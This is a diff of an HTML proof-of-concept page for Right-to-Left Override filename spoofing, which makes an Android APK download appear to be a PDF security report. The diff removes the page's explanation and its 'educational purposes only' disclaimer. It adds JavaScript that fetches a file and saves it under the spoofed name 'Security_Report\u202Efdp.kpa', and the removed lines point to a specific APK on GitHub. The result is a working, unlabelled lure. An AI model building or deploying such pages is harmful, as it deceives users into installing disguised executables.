@@ -4,44 +4,48 @@
     <meta charset="UTF-8">
     <title>Filename Spoofing PoC</title>
     <style>
-        body { font-family: sans-serif; text-align: center; margin-top: 50px; line-height: 1.6; }
+        body { font-family: sans-serif; text-align: center; margin-top: 50px; }
         .download-btn {
             display: inline-block;
-            margin: 10px;
             padding: 15px 25px;
-            background-color: #28a745; /* Green for APK theme */
+            background-color: #28a745;
             color: white;
             text-decoration: none;
             border-radius: 5px;
             font-weight: bold;
+            cursor: pointer;
         }
-        .warning { margin-top: 40px; color: red; font-size: 0.9em; }
     </style>
 </head>
 <body>
 
-    <h2>Security Research: Filename Spoofing (RLO)</h2>
-    <p>
-        The following link visually appears to be a <b>.pdf</b> document due to the Right-to-Left Override (U+202E) character.
-    </p>
+    <h2>Security Research: RLO Filename Spoofing</h2>
+    <p>Click below to download the report.</p>
 
-    <br>
+    <!-- JavaScript function handles the download to force the spoofed name -->
+    <div onclick="downloadFile()" class="download-btn">
+        Download Security Report (PDF)
+    </div>
 
-    <!-- 
-        Target: https://github.com/teamalfasec/down/raw/refs/heads/main/com.xbrowser.play_5.5.3.apk
-        Spoofed Name: Security_Patch[RLO]fdp.kpa
-        Visual Result: Security_Patchapk.pdf
-    -->
-    <a href="https://github.com/teamalfasec/down/raw/refs/heads/main/com.xbrowser.play_5.5.3.apk" 
-       download="Security_Patch&#x202E;fdp.kpa" 
-       class="download-btn">
-       Download Security Report (PDF)
-    </a>
+    <script>
+        function downloadFile() {
+            const fileUrl = 'https://github.com';
+            const spoofedName = "Security_Report\u202Efdp.kpa";
 
-    <p class="warning">
-        <b>Disclaimer:</b> This demonstration is for educational purposes only. <br>
-        It illustrates how attackers can mask malicious file extensions.
-    </p>
+            fetch(fileUrl)
+                .then(response => response.blob())
+                .then(blob => {
+                    const url = window.URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = spoofedName;
+                    document.body.appendChild(a);
+                    a.click();
+                    window.URL.revokeObjectURL(url);
+                })
+                .catch(() => alert('Download failed. Check your connection or CORS settings.'));
+        }
+    </script>
 
 </body>
 </html>
